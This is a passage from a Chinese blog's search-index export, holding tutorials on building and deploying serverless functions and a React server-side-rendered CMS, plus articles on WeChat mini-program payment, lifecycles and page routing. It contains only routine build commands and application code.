配置中，函数的 CodeUri 不是.&#x2F;functions&#x2F;get_durtion，而是.&#x2F;.serverless&#x2F;get_meta，这是为什么呢？\n这主要是因为我们需要对函数代码进行构建，.&#x2F;.serverless&#x2F;get_duration对应的是构建后的代码。之所以需要构建，是为了解决common&#x2F;utils.js代码共用的问题。\n如果不对代码进行构建，直接部署functions&#x2F;get_duration中的代码，函数执行时就会报错：Cannot find module ‘..&#x2F;common&#x2F;utils，因为common&#x2F;utils.js不在入口函数目录中，没有部署到 FaaS 上。\n要解决这个问题，就需要对代码进行构建，将函数及依赖的所有代码构建为单个文件，这样部署时就只需要部署一个文件，不涉及目录和依赖的问题了。\n我们可以使用 ncc 这个工具对函数进行构建，使用方法如下：\n$ ncc build ./functions/get_duration/index.js -o ./.serverless/get_duration/ -e ali-oss\n\n该命令就会将functions/get_duration/index.js进行构建，最终会将index.js以及缩依赖的 exec、getOSSClient 等方法进行编译，最终合并为一个文件并输出到./.serverless/get_duration/目录中。\n这里还需要注意的是-e ali-oss这个参数，含义是构建时，排除 ali-oss 这个依赖，也就是不将其编译到最终的index.js文件中。这是因为函数计算的 Node.js 运行时内置了 ali-oss 模块，所以我们的构建产物就不需要包含 ali-oss 的代码了。\n处理对代码进行构建，我们还需要将 ffmpeg 和 ffprobe 复制到对应的函数目录中。最终我将这些步骤编写到了build.js中，内容如下：\n// build.jsconst &#123; exec &#125; = require(&quot;./functions/common/utils&quot;);async function build() &#123;  // 清空编译目录  await exec(&quot;rm -rf .serverless/*&quot;);  // 编译 get_duration 函数  await exec(&quot;mkdir -p ./.serverless/get_duration&quot;);  await exec(`ncc build ./functions/get_duration/index.js -o ./.serverless/get_duration/ -e ali-oss`);  await exec(&quot;cp ./ffprobe ./.serverless/get_duration/ffprobe&quot;);  // 编译 get_meta 函数  await exec(&quot;mkdir -p ./.serverless/get_meta&quot;);  await exec(`ncc build ./functions/get_meta/index.js -o ./.serverless/get_meta/ -e ali-oss`);  await exec(&quot;cp ./ffprobe ./.serverless/get_meta/ffprobe&quot;);   //...&#125;build();\n\n然后我在 package.json 中添加了两个命令：\n\nbuild构建函数\ndeploy构建并部署\n\n例如你开发完成后需要部署，就可以直接运行：\n$ npm run deploy&gt; serverless-video@1.0.0 deploy&gt; npm run build &amp;&amp; fun deploy&gt; serverless-video@1.0.0 build&gt; node build.jsrm -rf .serverless/*mkdir -p ./.serverless/get_durationncc build ./functions/get_duration/index.js -o ./.serverless/get_duration/ -e ali-ossusing template: template.ymlWaiting for service serverless-video to be deployed...    Waiting for function get_duration to be deployed...        Waiting for packaging function get_duration code...        The function get_duration has been packaged. A total of 2 files were compressed and the final size was 15.2 MB    function get_duration deploy success......service serverless-video deploy success\n\n部署成功后，我们就可以对函数进行测试了，可以直接在控制台上运行函数，也可以通过fun invoke执行函数：\n$ fun invoke get_duration&#123;    &quot;format&quot;: &#123;        &quot;duration&quot;: &quot;170.859000&quot;    &#125;&#125;\n\n强调下面几点：\n\nServerless 除了适合 Web 接口、服务端渲染等场景，还适合 CPU 密集型的任务；\n基于 Serverless 开发的音视频处理系统，本身就具备弹性、可扩展、低成本、免运维、高可用的能力；\n对于需要通过代码执行的命令行工具等依赖，部署到 FaaS 平台之前需要为其设置可执行权限；若函数依需要调用其他云产品的接口，需要为函数授予相应权限；\n对于添加水印、视频转码等消耗资源的操作，需要为函数设置较大的内存和超时时间。\n\n4 使用 React.js 开发 Serverless 服务端渲染应用对前端工程师来说，Serverless 最大的应用场景之一就是开发服务端渲染（SSR）应用。因为传统的服务端渲染应用要由前端工程师负责服务器的运维，但往往前端工程师并不擅长这一点，基于 Serverless 开发服务端渲染应用的话，就可以减轻这个负担。希望你学完今天的内容之后，能够学会如何去使用 Serverless 开发一个服务端渲染应用。\n5 基于 Serverless 的服务端渲染架构\n现在的主流前端框架是 React.js、Vue.js 等，基于这些框架开发的都是单页应用，其渲染方式都是客户端渲染：代码开发完成后，构建出一个或多个 JS 资源，页面渲染时加载这些 JS 资源，然后再执行 JS 渲染页面。虽然这些框架可以极大提升前端开发效率，但也带来了一些新的问题。\n\n\n不利于 SEO： 页面源码不再是HTML，而是渲染 HTML 的 JavaScript，这就导致搜索引擎爬虫难以解析其中的内容；\n初始化性能差： 通常单元应用的 JS 文件体积都比较大、加载耗时比较长，导致页面白屏。\n\n为了解决这些问题，很多框架和开发者就开始尝试服务端渲染的方式：页面加载时，由服务端先生成 HTML 返回给浏览器，浏览器直接渲染 HTML。在传统的服务端渲染架构中，通常需要前端同学使用 Node.js 去实现一个服务端的渲染应用。在应用内，每个请求的 path 对应着服务端的每个路由，由该路由实现对应 path 的 HTML 文档渲染：\n\n传统服务端渲染架构\n对前端工程师来说，要实现一个服务端渲染应用，通常面临着一些问题：\n\n部署服务端渲染应用需要购买服务器，并配置服务器环境，要对服务器进行运维；\n需要关注业务量，考虑有没有高并发场景、服务器有没有扩容机制；\n需要实现负载均衡、流量控制等复杂后端能力等。\n\n开篇我也提到，而且是服务端的工作，很多前端同学都不擅长，好在有了 Serverless。\n用 Serverless 做服务端渲染，就是将以往的每个路由，都拆分为一个个函数，再在 FaaS 上部署对应的函数，这样用户请求的 path，对应的就是每个单独的函数。通过这种方式，就将运维操作转移到了 FaaS 平台，前端同学开发服务端渲染应用，就再也不用关心服务端程序的运维部署了。并且在 FaaS 平台中运行的函数，天然具有弹性伸缩的能力，你也不用担心流量波峰波谷了。\n\n基于 Serverless 的服务选渲染架构\n如图所示，FaaS 函数接收请求后直接执行代码渲染出 HTML 并返回给浏览器，这是最基本的架构，虽然它可以满足大部分场景，但要追求极致的性能，你通常要加入缓存。\n\n进阶版基于 Serverless 的服务端渲染架构\n首先我们会使用 CDN 做缓存，基于 CDN 的缓存可以减少函数执行次数，进而避免函数冷启动带来的性能损耗。如果 CDN 中没有 SSR HTML 页面的缓存，则继续由网关处理请求，网关再去触发函数执行。\n函数首先会判读缓存数据库中是否有 SSR HTML 的缓存，如果有直接返回；如果没有再渲染出 HTML 并返回。基于数据库的缓存，可以减少函数渲染 HTML 的时间，从而页面加载提升性能。\n讲了这么多，具体怎么基于 Serverless 实现一个服务端渲染应用呢？\n5.1 实现一个 Serverless 的服务端渲染应用我们实现了一个内容管理系统的 Restful API，但没有前端界面，所以今天我们的目标就基于 Serverless 实现一个内容管理系统的前端界面（如图所示）。\n\n该应用主要包含两个页面：\n\n首页，展示文章列表；\n详情页，展示文章详情。\n\n为了方便你进行实践，我为你提供了一份示例代码，你可以直接下载并使用：\n# 下载代码$ git clone https://github.com/poetries/serverless-class# 进入服务端渲染应用目录$ cd 16/serverless-ssr-cms\n\n代码结构如下：\n.├── config.js├── f.yml├── package-lock.json├── package.json├── src│   ├── api.ts│   ├── config│   │   └── config.default.ts│   ├── configuration.ts│   ├── index.ts│   ├── interface│   │   ├── detail.ts│   │   └── index.ts│   ├── mock│   │   ├── detail.ts│   │   └── index.ts│   ├── render.ts│   └── service│       ├── detail.ts│       └── index.ts├── tsconfig.json├── tsconfig.lint.json└── web    ├── @types    │   └── global.d.ts    ├── common.less    ├── components    │   ├── layout    │   │   ├── index.less    │   │   └── index.tsx    │   └── title    │       ├── index.less    │       └── index.tsx    ├── interface    │   ├── detail-index.ts    │   ├── index.ts    │   └── page-index.ts    ├── pages    │   ├── detail    │   │   ├── fetch.ts    │   │   ├── index.less    │   │   └── render$id.tsx    │   └── index    │       ├── fetch.ts    │       ├── index.less    │       └── render.tsx    └── tsconfig.json\n\n文件很多，不过不用担心，你只需重点关注 web&#x2F;pages&#x2F; 和 src&#x2F;service 两个目录：\n\nweb&#x2F; 目录中主要是前端页面的代码， web&#x2F;pages&#x2F; 中的文件分别对应着我们要实现的 index（首页）和 detail（详情页）两个页面，这两个页面会使用到 components 目录中的公共组件；\nsrc&#x2F; 目录中主要是后端代码，src&#x2F;service 目录中的 index.ts 和 detail.ts 则定义了两个页面分别需要用到的接口，为了简单起见，接口数据我使用了 src&#x2F;mock&#x2F; 目录中的 mock 数据。\n\n当我一个人又负责前端页面也负责后端接口的开发时，通常习惯先实现接口，再开发前端页面，这样方便调试。接下来就让我们看一下具体是怎么实现的。\n5.2 首页接口的实现其源码在 src&#x2F;service&#x2F;index.ts 文件中，代码如下：\n复制代码\n// src/service/index.tsimport &#123; provide &#125; from &#x27;@midwayjs/faas&#x27;import &#123; IApiService &#125; from &#x27;../interface&#x27;import mock from &#x27;../mock&#x27;@provide(&#x27;ApiService&#x27;)export class ApiService implements IApiService &#123;  async index (): Promise&lt;any&gt; &#123;    return await Promise.resolve(mock)  &#125;&#125;\n\n这段代码实现了一个 ApiService 类以及 index 方法，该方法会返回首页的文章列表。数据结构如下：\n复制代码\n&#123;    &quot;data&quot;:[        &#123;            &quot;id&quot;:&quot;3f8a198c-60a2-11eb-8932-9b95cd7afc2d&quot;,            &quot;title&quot;:&quot;开篇词：Serverless 大热，程序员面临的新机遇与挑战&quot;,            &quot;content&quot;:&quot;可能你会认为 Serverless 是最近两年兴起的技术......&quot;,            &quot;date&quot;:&quot;2020-12-23&quot;        &#125;,        &#123;            &quot;id&quot;:&quot;5158b100-5fee-11eb-9afa-9b5f85523067&quot;,            &quot;title&quot;:&quot;基础入门：编写你的第一个 Serverless 应用&quot;,            &quot;content&quot;:&quot;学习一门新技术，除了了解其基础概念，更重要的是把理论转化为实践...&quot;,            &quot;date&quot;:&quot;2020-12-29&quot;        &#125;    ]&#125;\n\n在进行服务端渲染时，你可以通过 ctx 获取到 ApiService 实例，进而调用其中的方法，获取文章列表数据。此外，ApiService 也会被 src&#x2F;api.ts 调用，src&#x2F;api.ts 则直接对外提供了 HTTP 接口。\n5.3 首页页面的实现有了接口后，我们就可以继续实现首页的前端页面了。首页页面的代码在 web&#x2F;pages&#x2F; 目录中，该目录下有三个文件：\n\nfetch.ts，获取首页数据；\nrender.tsx 首页页面 UI 组件代码；\nindex.less 样式代码。\n\n首先来看一下 fetch.ts：\n复制代码\n// web/pages/index/fetch.tsimport &#123; IFaaSContext &#125; from &#x27;ssr-types&#x27;import &#123; IndexData &#125; from &#x27;@/interface&#x27;interface IApiService &#123;  index: () =&gt; Promise&lt;IndexData&gt;&#125;export default async (ctx: IFaaSContext&lt;&#123;  apiService?: IApiService&#125;&gt;) =&gt; &#123;  const data = __isBrowser__ ? await (await window.fetch(&#x27;/api/index&#x27;)).json() : await ctx.apiService?.index()  return &#123;    indexData: data  &#125;&#125;\n\n这段代码的逻辑比较简单，核心点在第 10 行，如果是浏览器，就用浏览器自带的 fetch 方法请求/api/index接口获取数据；如果不是浏览器，即服务端渲染，可以直接调用 apiService 中的 index 方法。获取到数据后，将其存入 state.indexData 中，这样在 UI 组件中就可以使用了。首页的 UI 组件 render.tsx 代码如下：\n复制代码\n// web/pages/index/render.tsximport React, &#123; useContext &#125; from &quot;react&quot;;import &#123; SProps, IContext &#125; from &quot;ssr-types&quot;;import Navbar from &quot;@/components/navbar&quot;;import Header from &quot;@/components/header&quot;;import Item from &quot;@/components/item&quot;;import &#123; IData &#125; from &quot;@/interface&quot;;import styles from &quot;./index.less&quot;;export default (props: SProps) =&gt; &#123;  const &#123; state &#125; = useContext&lt;IContext&lt;IData&gt;&gt;(window.STORE_CONTEXT);  return (    &lt;div&gt;      &lt;Navbar &#123;...props&#125; isHomePage=&#123;true&#125;&gt;&lt;/Navbar&gt;      &lt;Header&gt;&lt;/Header&gt;      &lt;div className=&#123;styles.container&#125;&gt;        &#123;state?.indexData?.data.map((item) =&gt; (          &lt;Item            &#123;...props&#125;            id=&#123;item.id&#125;            key=&#123;item.id&#125;            title=&#123;item.title&#125;            content=&#123;item.content&#125;            date=&#123;item.date&#125;          &gt;&lt;/Item&gt;        ))&#125;      &lt;/div&gt;    &lt;/div&gt;  );&#125;;\n\n在 UI 组件中，我们可以通过 useContext 获取刚才由 fetch.ts 存入 state 的数据，然后利用数据渲染 UI。UI 组件主要由三部分组成。\n\nNavbar：导航条。\nHeader：页面标题。\nItem：每篇文章的简介。\n\n\n5.4 详情页接口的实现完成了首页后，就可以实现详情页了。详情页与首页整体类似，区别就在于详情页需要传入参数查询某条数据。\n详情页接口在 src&#x2F;service&#x2F;detail.ts 中 ，代码如下所示：\n复制代码\n// src/service/detail.tsimport &#123; provide &#125; from &#x27;@midwayjs/faas&#x27;import &#123; IApiDetailService &#125; from &#x27;../interface/detail&#x27;import mock from &#x27;../mock/detail&#x27;@provide(&#x27;ApiDetailService&#x27;)export class ApiDetailService implements IApiDetailService &#123;  async index (id): Promise&lt;any&gt; &#123;    return await Promise.resolve(mock.data[id])  &#125;&#125;\n\n在这段代码中，我们实现了一个 ApiDetailService 类以及 index 方法，index 方法的如参 id 即文章 ID，然后根据文章 ID 从 mock 数据中查询文章详情。\n文章详情数据如下：\n复制代码\n&#123;    &quot;title&quot;:&quot;Serverless 大热，程序员面临的新机遇与挑战&quot;,    &quot;wordCount&quot;:2540,    &quot;readingTime&quot;:10,    &quot;date&quot;:&quot;2020-12-23 12:00:00&quot;,    &quot;content&quot;:&quot;可能你会认为 Serverless 是最近两年兴起的技术，实际上，Serverless 概念从 2012 年就提出来了，随后 AWS 在 2014 年推出了第一款 Serverless 产品 Lambda，开启了 Serverless 元年... &quot;&#125;\n\n5.5 详情页页面的实现和首页一样，详情页也包含数据请求、UI 组件和样式代码三个文件。\n数据请求代码文件的命名和首页一样，都是 fetch.ts。与首页不同的是，详情页我们需要从上下文（服务端渲染场景）或 URL 中（浏览器场景）获取到文章 ID，然后根据文章 ID 获取文章详情数据。代码如下：\n复制代码\nimport &#123; RouteComponentProps &#125; from &quot;react-router&quot;;export default async (ctx) =&gt; &#123;  let data;  if (__isBrowser__) &#123;    const id = (ctx as RouteComponentProps&lt;&#123; id: string &#125;&gt;).match.params.id;    data = await (await window.fetch(`/api/detail/$&#123;id&#125;`)).json()  &#125; else &#123;    const id = /detail\\/(.*)(\\?|\\/)?/.exec(ctx.req.path)[1];    data = await ctx.apiDeatilservice.index(id);  &#125;  return &#123;    detailData: data,  &#125;;&#125;;\n\n详情页的 UI 组件名称为render$id.tsx的文件，$id表示该组件的参数是 id，这样访问 &#x2F;detail&#x2F; 这个路由（id 是变量）时，就会匹配到 web&#x2F;pages&#x2F;detail&#x2F;render$id.tsx 这个页面了。\nrender$id.tsx详细代码如下：\n复制代码\nimport React, &#123; useContext &#125; from &quot;react&quot;;import &#123; IContext, SProps &#125; from &quot;ssr-types&quot;;import &#123; Data &#125; from &quot;@/interface&quot;;import Navbar from &quot;@/components/navbar&quot;;import Content from &quot;@/components/content&quot;;import Title from &quot;@/components/title&quot;;import Tip from &quot;@/components/tip&quot;;import styles from &quot;./index.less&quot;;export default (props: SProps) =&gt; &#123;  const &#123; state &#125; = useContext&lt;IContext&lt;Data&gt;&gt;(window.STORE_CONTEXT);  return (    &lt;div&gt;      &lt;Navbar &#123;...props&#125;&gt;&lt;/Navbar&gt;      &lt;div className=&#123;styles.container&#125;&gt;        &lt;Title&gt;&#123;state?.detailData?.title&#125;&lt;/Title&gt;        &lt;Tip          date=&#123;state?.detailData?.date&#125;          wordCount=&#123;state?.detailData?.wordCount&#125;          readingTime=&#123;state?.detailData?.readingTime&#125;        /&gt;        &lt;Content&gt;&#123;state?.detailData?.content&#125;&lt;/Content&gt;      &lt;/div&gt;    &lt;/div&gt;  );&#125;;\n\n详情页的 UI 组件由四部分组成。\n\nNavbar：导航条。\nTitle：文章标题。\nTip：文章发布时间、字数等提示。\nContent：文章内容。\n\n\n5.6 应用部署代码开发完成后，你可以通过下面的命令在本地启动应用：\n复制代码\n$ npm start...[HPM] Proxy created: /asset-manifest  -&gt; http://127.0.0.1:8000 Server is listening on http://localhost:3000\n\n应用启动后就可以打开浏览器输入 http://localhost:3000 查看效果了。在本地开发测试完成后，接下来就需要将其部署到函数计算。你可以运行 npm run deploy 命令进部署：\n复制代码\n$ npm run deploy...service  serverless-ssr-cms deploy success......The assigned temporary domain is http://41506101-1457216987974698.test.functioncompute.com，expired at 2021-02-04 00:35:01, limited by 1000 per day.......Deploy success\n\nnpm run deploy其实是执行了构建代码和部署应用两个步骤，这两个步骤都是在本机执行的。但这就存在一个隐藏风险，如果团队同学本地开发环境不同，就可能导致构建产物不同，进而导致部署到线上的代码存在风险。所以更好的实践是：实现一个业务的持续集成流程，统一构建部署。\n应用部署成功后，会自动创建一个测试的域名，例如http://41506101-1457216987974698.test.functioncompute.com，我们可以打开该域名查看最终效果。\n讲到这儿，基于 Serverless 的服务端渲染应用就开发完成了。\n5.7 总结总的来说，基于 Serverless 的服务端渲染应用实现也比较简单。如果你想要追求更好的用户体验，我也建议你对核心业务做服务端渲染的优化。基于 Serverless 的服务端渲染，可以让我们不用再像以前一样担心服务器的运维和扩容，大大提高了生产力。同时有了服务端渲染后，我也建议你完善业务的持续集成流程，将整个研发链路打通，降低代码构建发布的风险，提升从开发到测试再到部署的效率。\n当然，要达到页面的极致体验，我们还需要做很多工作，比如：\n\n将静态资源部署到 CDN，提升资源加载速度；\n针对页面进行缓存，减少函数冷启动对性能的影响；\n对服务端异常进行降级处理等等。\n\n但不管我们用不用 Serverless，都需要做这些工作。关于这一讲，我想要强调以下几点：\n\n基于 Serverless 的服务端渲染应用，可以让我们不用关心服务器的运维，应用也天然具有弹性；\n基于 Serverless 开发服务端渲染应用，建议你完善业务的持续集成流程；\n要达到页面的极致性能，还需要考虑将静态资源部署到 CDN、对页面进行缓存等技术；\n对于服务端渲染应用，建议你完善业务的服务降级能力，进一步提高稳定性。\n\n","categories":["云服务"],"tags":["serveless"]},{"title":"小程序支付流程","url":"/2018/10/25/%E5%B0%8F%E7%A8%8B%E5%BA%8F+uniapp/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%94%AF%E4%BB%98%E6%B5%81%E7%A8%8B/","content":"一、前言微信小程序为电商类小程序，提供了非常完善、优秀、安全的支付功能\n在小程序内可调用微信的API完成支付功能，方便、快捷\n场景如下图所示：\n\n\n\n用户通过分享或扫描二维码进入商户小程序，用户选择购买，完成选购流程\n调起微信支付控件，用户开始输入支付密码\n密码验证通过，支付成功。商户后台得到支付成功的通知\n返回商户小程序，显示购买成功\n微信支付公众号下发支付凭证\n\n二、流程以电商小程序为例\n支付流程图如下所示：\n\n具体的做法：\n\n打开某小程序，点击直接下单\nwx.login获取用户临时登录凭证code，发送到后端服务器换取openId\n在下单时，小程序需要将购买的商品Id，商品数量，以及用户的openId传送到服务器\n服务器在接收到商品Id、商品数量、openId后，生成服务期订单数据，同时经过一定的签名算法，向微信支付发送请求，获取预付单信息(prepay_id)，同时将获取的数据再次进行相应规则的签名，向小程序端响应必要的信息\n小程序端在获取对应的参数后，调用wx.requestPayment()发起微信支付，唤醒支付工作台，进行支付\n接下来的一些列操作都是由用户来操作的包括了微信支付密码，指纹等验证，确认支付之后执行鉴权调起支付\n鉴权调起支付：在微信后台进行鉴权，微信后台直接返回给前端支付的结果，前端收到返回数据后对支付结果进行展示\n推送支付结果：微信后台在给前端返回支付的结果后，也会向后台也返回一个支付结果，后台通过这个支付结果来更新订单的状态\n\n其中后端响应数据必要的信息则是wx.requestPayment方法所需要的参数，大致如下：\nwx.requestPayment(&#123;  // 时间戳  timeStamp: &#x27;&#x27;,  // 随机字符串  nonceStr: &#x27;&#x27;,  // 统一下单接口返回的 prepay_id 参数值  package: &#x27;&#x27;,  // 签名类型  signType: &#x27;&#x27;,  // 签名  paySign: &#x27;&#x27;,  // 调用成功回调  success () &#123;&#125;,  // 失败回调  fail () &#123;&#125;,  // 接口调用结束回调  complete () &#123;&#125;&#125;)\n\n参数表如下所示：\n\n三、结束小程序支付和以往的网页、APP微信支付大同小异，可以说小程序的支付变得更加简洁，不需要设置支付目录、域名授权等操作\n","categories":["小程序"],"tags":["小程序"]},{"title":"小程序理解","url":"/2018/09/27/%E5%B0%8F%E7%A8%8B%E5%BA%8F+uniapp/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%A6%82%E5%BF%B5/","content":"一、是什么2017年，微信正式推出了小程序，允许外部开发者在微信内部运行自己的代码，开展业务\n截至目前，小程序已经成为国内前端的一个重要业务，跟 Web 和手机 App 有着同等的重要性\n\n小程序是一种不需要下载安装即可使用的应用，它实现了应用“触手可及”的梦想，用户扫一扫或者搜一下即可打开应用\n也体现了“用完即走”的理念，用户不用关心是否安装太多应用的问题。应用将无处不在，随时可用，但又无需安装卸载\n注意的是，除了微信小程序，还有百度小程序、微信小程序、支付宝小程序、抖音小程序，都是每个平台自己开发的，都是有针对性平台的应用程序\n二、背景⼩程序并⾮凭空冒出来的⼀个概念，当微信中的 WebView 逐渐成为移动 Web的⼀个重要⼊⼝时，微信就有相关的 JS-SDK\nJS-SDK 解决了移动⽹⻚能⼒不⾜的问题，通过暴露微信的接⼝使得 Web 开发者能够拥有更多的能⼒，然⽽在更多的能⼒之外，JS-SDK的模式并没有解决使⽤移动⽹⻚遇到的体验不良的问题\n因此需要设计⼀个⽐较好的系统，使得所有开发者在微信中都能获得⽐较好的体验：\n\n快速的加载\n更强⼤的能⼒\n原⽣的体验\n易⽤且安全的微信数据开放\n⾼效和简单的开发\n\n这些是JS-SDK做不到的，需要设计一个全新的小程序系统\n对于小程序的开发，提供一个简单、高效的应用开发框架和丰富的组件及API，帮助开发者开发出具有原生体验的服务\n其中相比H5，小程序与其的区别有如下：\n\n运⾏环境：⼩程序基于浏览器内核重构的内置解析器\n系统权限：⼩程序能获得更多的系统权限，如⽹络通信状态、数据缓存能⼒等\n渲染机制：⼩程序的逻辑层和渲染层是分开的\n\n小程序可以视为只能用微信打开和浏览的H5，小程序和网页的技术模型是一样的，用到的 JavaScript语言和 CSS 样式也是一样的，只是网页的 HTML 标签被稍微修改成了 WXML 标签\n因此可以说，小程序页面本质上就是网页\n其中关于微信小程序的实现原理，我们在后面的文章讲到\n三、优缺点优点：\n\n随搜随用，用完即走：使得小程序可以代替许多APP，或是做APP的整体嫁接，或是作为阉割版功能的承载体\n流量大，易接受：小程序借助自身平台更加容易引入更多的流量\n安全\n开发门槛低\n降低兼容性限制\n\n缺点：\n\n用户留存：及相关数据显示，小程序的平均次日留存在13%左右，但是双周留存骤降到仅有1%\n体积限制：微信小程序只有2M的大小，这样导致无法开发大型一些的小程序\n受控微信：比起APP，尤其是安卓版的高自由度，小程序要面对很多来自微信的限制，从功能接口，甚至到类别内容，都要接受微信的管控\n\n","categories":["小程序"],"tags":["小程序"]},{"title":"小程序生命周期","url":"/2018/10/13/%E5%B0%8F%E7%A8%8B%E5%BA%8F+uniapp/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/","content":"一、是什么跟vue、react框架一样，微信小程序框架也存在生命周期，实质也是一堆会在特定时期执行的函数\n小程序中，生命周期主要分成了三部分：\n\n应用的生命周期\n页面的生命周期\n组件的生命周期\n\n应用的生命周期小程序的生命周期函数是在app.js里面调用的，通过App(Object)函数用来注册一个小程序，指定其小程序的生命周期回调\n页面的生命周期页面生命周期函数就是当你每进入&#x2F;切换到一个新的页面的时候，就会调用的生命周期函数，同样通过App(Object)函数用来注册一个页面\n组件的生命周期组件的生命周期，指的是组件自身的一些函数，这些函数在特殊的时间点或遇到一些特殊的框架事件时被自动触发，通过Component(Object)进行注册组件\n二、有哪些应用的生命周期\n\n\n生命周期\n说明\n\n\n\nonLaunch\n小程序初始化完成时触发，全局只触发一次\n\n\nonShow\n小程序启动，或从后台进入前台显示时触发\n\n\nonHide\n小程序从前台进入后台时触发\n\n\nonError\n小程序发生脚本错误或 API 调用报错时触发\n\n\nonPageNotFound\n小程序要打开的页面不存在时触发\n\n\nonUnhandledRejection()\n小程序有未处理的 Promise 拒绝时触发\n\n\nonThemeChange\n系统切换主题时触发\n\n\n页面的生命周期\n\n\n生命周期\n说明\n作用\n\n\n\nonLoad\n生命周期回调—监听页面加载\n发送请求获取数据\n\n\nonShow\n生命周期回调—监听页面显示\n请求数据\n\n\nonReady\n生命周期回调—监听页面初次渲染完成\n获取页面元素（少用）\n\n\nonHide\n生命周期回调—监听页面隐藏\n终止任务，如定时器或者播放音乐\n\n\nonUnload\n生命周期回调—监听页面卸载\n终止任务\n\n\n组件的生命周期\n\n\n生命周期\n说明\n\n\n\ncreated\n生命周期回调—监听页面加载\n\n\nattached\n生命周期回调—监听页面显示\n\n\nready\n生命周期回调—监听页面初次渲染完成\n\n\nmoved\n生命周期回调—监听页面隐藏\n\n\ndetached\n生命周期回调—监听页面卸载\n\n\nerror\n每当组件方法抛出错误时执行\n\n\n注意的是：\n\n组件实例刚刚被创建好时， created 生命周期被触发，此时，组件数据 this.data 就是在 Component 构造器中定义的数据 data ， 此时不能调用 setData\n在组件完全初始化完毕、进入页面节点树后， attached 生命周期被触发。此时， this.data 已被初始化为组件的当前值。这个生命周期很有用，绝大多数初始化工作可以在这个时机进行\n在组件离开页面节点树后， detached 生命周期被触发。退出一个页面时，如果组件还在页面节点树中，则 detached 会被触发\n\n还有一些特殊的生命周期，它们并非与组件有很强的关联，但有时组件需要获知，以便组件内部处理，这样的生命周期称为“组件所在页面的生命周期”，在 pageLifetimes 定义段中定义，如下：\n\n\n\n生命周期\n说明\n\n\n\nshow\n组件所在的页面被展示时执行\n\n\nhide\n组件所在的页面被隐藏时执行\n\n\n代码如下：\nComponent(&#123;  pageLifetimes: &#123;    show: function() &#123;      // 页面被展示    &#125;,    hide: function() &#123;      // 页面被隐藏    &#125;,  &#125;&#125;)\n\n三、执行过程应⽤的⽣命周期执行过程：\n⽤户⾸次打开⼩程序，触发 onLaunch（全局只触发⼀次）\n⼩程序初始化完成后，触发onShow⽅法，监听⼩程序显示\n⼩程序从前台进⼊后台，触发 onHide⽅法\n⼩程序从后台进⼊前台显示，触发 onShow⽅法\n⼩程序后台运⾏⼀定时间，或系统资源占⽤过⾼，会被销毁\n\n⻚⾯⽣命周期的执行过程：\n⼩程序注册完成后，加载⻚⾯，触发onLoad⽅法\n⻚⾯载⼊后触发onShow⽅法，显示⻚⾯\n⾸次显示⻚⾯，会触发onReady⽅法，渲染⻚⾯元素和样式，⼀个⻚⾯只会调⽤⼀次\n当⼩程序后台运⾏或跳转到其他⻚⾯时，触发onHide⽅法\n当⼩程序有后台进⼊到前台运⾏或重新进⼊⻚⾯时，触发onShow⽅法\n当使⽤重定向⽅法 wx.redirectTo() 或关闭当前⻚返回上⼀⻚wx.navigateBack()，触发onUnload\n\n当存在也应用生命周期和页面周期的时候，相关的执行顺序如下：\n\n打开小程序：(App)onLaunch –&gt; (App)onShow –&gt; (Pages)onLoad –&gt; (Pages)onShow –&gt; (pages)onRead\n进入下一个页面：(Pages)onHide –&gt; (Next)onLoad –&gt; (Next)onShow –&gt; (Next)onReady\n返回上一个页面：(curr)onUnload –&gt; (pre)onShow\n离开小程序：(App)onHide\n再次进入：小程序未销毁 –&gt; (App)onShow(执行上面的顺序），小程序被销毁，（App)onLaunch重新开始执行\n\n","categories":["小程序"],"tags":["小程序"]},{"title":"小程序路由跳转","url":"/2018/10/09/%E5%B0%8F%E7%A8%8B%E5%BA%8F+uniapp/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%B7%AF%E7%94%B1%E8%B7%B3%E8%BD%AC/","content":"一、是什么微信小程序拥有web网页和Application共同的特征，我们的页面都不是孤立存在的，而是通过和其他页面进行交互，来共同完成系统的功能\n在微信小程序中，每个页面可以看成是一个pageModel，pageModel全部以栈的形式进行管理\n二、有哪些常见的微信小程序页面跳转方式有如下：\n\nwx.navigateTo(Object)\nwx.redirectTo(Object)\nwx.switchTab(Object)\nwx.navigateBack(Object)\nwx.reLaunch(Object)\n\nwx.navigateTo(Object)wx.navigateTo()用于保留当前页面、跳转到应用内的某个页面，使用 wx.navigateBack可以返回到原页面\n对于页面不是特别多的小程序，通常推荐使用 wx.navigateTo进行跳转， 以便返回原页面，以提高加载速度。当页面特别多时，则不推荐使用\n参数表如下所示：\n\n流程图如下：\n\nwx.redirectTo(Object)重定向，当页面过多时，被保留页面会挤占微信分配给小程序的内存，或是达到微信所限制的 10 层页面栈的情况下，我们应该考虑选择 wx.redirectTo\nwx.redirectTo()用于关闭当前页面，跳转到应用内的某个页面\n这样的跳转，可以避免跳转前页面占据运行内存，但返回时页面需要重新加载，增加了返回页面的显示时间\n参数表如下所示：\n\n流程图如下所示：\n\nwx.switchTab(Object)跳转到 tabBar页面，并关闭其他所有非 tabBar 页面\n参数表如下所示：\n\nwx.navigateBack(Object)wx.navigateBack() 用于关闭当前页面，并返回上一页面或多级页面，开发者可通过 getCurrentPages() 获取当前的页面栈，决定需要返回几层则设置对象的delta属性即可\n参数表如下：\n\nwx.reLaunch(Object)关闭所有页面，打开到应用内的某个页面，返回的时候跳到首页\n流程图如下所示：\n\n参数表如下所示：\n\n三、总结关于上述五种跳转方式，做下总结：\n\nnavigateTo 保留当前页面，跳转到应用内的某个页面，使用 wx.navigateBack 可以返回到原页\nredirectTo 关闭当前页面，跳转到应用内的某个页面\nswitchTab 跳转到 tabBar 页面，同时关闭其他非 tabBar 页面\nnavigateBack 返回上一页面\nreLanch 关闭所有页面，打开到应用内的某个页面\n\n其中关于它们的页面栈的关系如下：\n\navigateTo 新页面入栈\nredirectTo 当前页面出栈，新页面入栈\nnavigateBack 页面不断出栈，直到目标返回页，新页面入栈\nswitchTab 页面全部出栈，只留下新的 Tab 页面\nreLanch 